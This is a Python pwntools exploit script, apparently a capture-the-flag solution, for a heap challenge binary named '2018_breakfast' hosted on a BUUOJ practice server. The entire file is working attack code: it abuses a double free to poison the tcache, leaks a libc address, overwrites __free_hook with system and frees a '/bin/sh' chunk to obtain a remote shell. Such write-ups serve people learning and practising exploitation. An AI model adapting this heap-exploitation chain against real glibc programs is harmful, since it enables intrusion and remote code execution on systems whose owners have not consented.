# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './2018_breakfast'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26213'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('5.- Exit',num)

def add(idx , size):
    cmd(1)
    sla('breakfast' , idx)
    sla('size in kcal.' , size)

def edit(idx , text):
    cmd(2)
    sla('ingredients' , idx)
    sla('Enter the ingredients' , text)

def show(idx ):
    cmd(3)
    sla('to see' , idx)

def delete(idx ):
    cmd(4)
    sla('delete' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0 , 0x68)
    add(1 , 0x68)

    delete(0)
    delete(1)

    edit(1 , p64(0x602040))
    add(2 , 0x68)
    add(3 , 0x68)


    edit(3 , p64(0x602020))
    show(0)

    libc.address = l64() - 0x3ec7e3
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']

    edit(3 , p64(__free_hook - 8))
    edit(0 , flat('/bin/sh\x00' , system_addr))
    delete(0)

    # dbg()

    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   2018_breakfast.py
@Time    :   2022/02/04 15:58:44
@Author  :   Niyah 
'''